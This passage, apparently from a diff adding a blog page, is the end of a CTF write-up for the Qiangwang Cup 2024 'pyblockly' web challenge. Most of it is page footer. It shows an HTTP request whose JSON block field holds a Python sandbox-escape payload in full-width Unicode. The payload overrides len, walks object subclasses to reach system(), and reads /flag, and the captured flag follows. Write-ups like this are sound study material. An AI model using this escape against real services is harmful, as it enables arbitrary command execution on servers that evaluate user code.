br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;blocks&quot;: &#123;</span><br><span class="line">    &quot;blocks&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;print&quot;,</span><br><span class="line">        &quot;id&quot;: &quot;print1&quot;,</span><br><span class="line">        &quot;inputs&quot;: &#123;</span><br><span class="line">          &quot;TEXT&quot;: &#123;</span><br><span class="line">            &quot;block&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;text&quot;,</span><br><span class="line">              &quot;id&quot;: &quot;text1&quot;,</span><br><span class="line"> &quot;fields&quot;: &#123;</span><br><span class="line">                &quot;TEXT&quot;: &quot;ｓ＂＇）\n＿＿ｂｕｉｌｔｉｎｓ＿＿．ｌｅｎ　＝　ｌａｍｂｄａ　ｘ：　３\n［　ｘ．＿＿ｉｎｉｔ＿＿．＿＿ｇｌｏｂａｌｓ＿＿　ｆｏｒ　ｘ　ｉｎ　＇＇．＿＿ｃｌａｓｓ＿＿．＿＿ｂａｓｅ＿＿．＿＿ｓｕｂｃｌａｓｓｅｓ＿＿（）　ｉｆ　ｘ．＿＿ｎａｍｅ＿＿＝＝＂＿ｗｒａｐ＿ｃｌｏｓｅ＂］［０］［＂ｓｙｓｔｅｍ＂］（＂ｄｄ　ｉｆ＝／ｆｌａｇ＂）\n＃&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag{7cla4fe8981e295a78508a49146340b9}</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&text=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&title=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&is_video=false&description=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=强网杯 2024 web pyblockly 单题wp&body=Check out this article: https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&title=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&title=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&title=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&title=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&name=强网杯 2024 web pyblockly 单题wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&t=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
